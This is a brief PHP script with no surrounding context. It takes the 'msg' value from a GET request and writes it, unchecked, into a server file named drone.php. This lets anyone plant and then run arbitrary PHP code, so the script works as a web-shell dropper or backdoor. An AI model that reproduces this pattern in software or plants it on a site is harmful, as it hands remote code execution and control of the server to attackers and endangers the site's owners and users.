<?php 
	if(isset($_GET['msg'])){
		file_put_contents('drone.php',$_GET['msg']);
	}
?>
